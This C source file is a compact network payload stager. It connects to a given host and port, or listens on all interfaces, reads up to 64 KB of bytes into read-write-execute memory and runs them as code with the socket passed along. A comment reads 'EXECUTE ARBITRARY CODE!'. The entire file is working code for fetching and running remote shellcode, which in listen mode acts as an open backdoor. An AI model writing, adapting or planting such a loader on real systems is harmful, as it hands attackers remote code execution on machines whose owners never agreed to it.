#define _GNU_SOURCE

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <netinet/in.h>

int connectTo(const char* hostname, const char* port){
    struct addrinfo hints;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family      = AF_UNSPEC;
    hints.ai_socktype    = SOCK_STREAM;
    hints.ai_protocol    = 0;
    hints.ai_flags       = AI_ADDRCONFIG;
    struct addrinfo* res = 0;
    int ret = getaddrinfo(hostname, port, &hints, &res);
    if(ret != 0){
        freeaddrinfo(res);
        return -1;
    }

    int fd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if(fd == -1) {
        freeaddrinfo(res);
        return -1;
    }

    if(connect(fd, res->ai_addr, res->ai_addrlen) == -1) {
        freeaddrinfo(res);
        return -1;
    }

    freeaddrinfo(res);
    return fd;
}

int listenOn(const uint16_t port){ /* XXX: typing not symmetric to connectTo */
    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if(server_fd < 0){
        fprintf(stderr, "Failed to create socket: %s\n",
                strerror(errno));
        return -1;
    }

    struct sockaddr_in server_address = {0};
    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = INADDR_ANY;
    server_address.sin_port = htons(port);
    if(bind(server_fd,
                (struct sockaddr*) &server_address,
                sizeof(server_address)) < 0){
        fprintf(stderr, "Failed to bind: %s\n",
                strerror(errno));
        close(server_fd);
        return -1;
    }

    listen(server_fd, 10);
    return server_fd;
}

int readChunk(int fd, char* chunk, ssize_t chunk_size){
    ssize_t bytes_read = 0;
    ssize_t recv_ret   = 0;
    while(1){
        recv_ret = recv(fd,
                        (void*)(chunk + bytes_read),
                        chunk_size - bytes_read,
                        0);
        if(recv_ret == -1){
            fprintf(stderr, "recv failed: %s\n",
                    strerror(errno));
            return 1;
        }
        if(recv_ret == 0) break;

        bytes_read += recv_ret;
        if(bytes_read >= chunk_size) break;
    }
    return 0;
}

#define CHUNK_SIZE 65536

typedef void ExecutableChunk(int fd);

int main(int argc, char** argv){
    if(argc != 3){
        fprintf(stderr,
                "usage: %s <host> <port>\n"
                "or:    %s -l <port> to listen for external connections\n"
                , argv[0]
                , argv[0]);
        return -1;
    }

    ExecutableChunk *chunk =
        (ExecutableChunk*) mmap(NULL, CHUNK_SIZE,
                                PROT_READ | PROT_WRITE | PROT_EXEC,
                                MAP_PRIVATE | MAP_ANONYMOUS,
                                0, 0);
    if((void*) chunk == MAP_FAILED){
        fprintf(stderr, "Failed to map executable chunk: %s\n",
                strerror(errno));
        return 1;
    }

    if(!strcmp(argv[1], "-l")){
        int port = atoi(argv[2]);
        int server_fd = listenOn(port);
        if(server_fd == -1){
            munmap((void*)chunk, CHUNK_SIZE);
            return 1;
        }

        fprintf(stderr, "Listening on port %i on all addresses\n", port);
        int client_fd = -1;
        while((client_fd = accept(server_fd, NULL, NULL)) != -1){
            fprintf(stderr, "Connected. Reading data...\n");

            if(readChunk(client_fd, (char*)chunk, CHUNK_SIZE)){
                close(client_fd);
                munmap((void*)chunk, CHUNK_SIZE);
                return 1;
            }

            fprintf(stderr, "Done. Executing code.\n");
            /* EXECUTE ARBITRARY CODE! */
            chunk(client_fd);

            fprintf(stderr, "The code exited.\n");
            close(client_fd);

            fprintf(stderr, "Listening for another client.\n");
        }
    }
    else{
        fprintf(stderr, "Connecting to %s on port %s\n", argv[1], argv[2]);
        int fd = connectTo(argv[1], argv[2]);
        if(fd == -1){
            fprintf(stderr, "Connection failed.\n");
            munmap((void*)chunk, CHUNK_SIZE);
            return 1;
        }

        fprintf(stderr, "Connected. Reading data...\n");

        if(readChunk(fd, (char*)chunk, CHUNK_SIZE)){
            close(fd);
            munmap((void*)chunk, CHUNK_SIZE);
            return 1;
        }

        fprintf(stderr, "Done. Executing code.\n");
        /* EXECUTE ARBITRARY CODE! */
        chunk(fd);

        fprintf(stderr, "The code exited.\n");
        close(fd);
        munmap((void*)chunk, CHUNK_SIZE);
    }

    return 0;
}
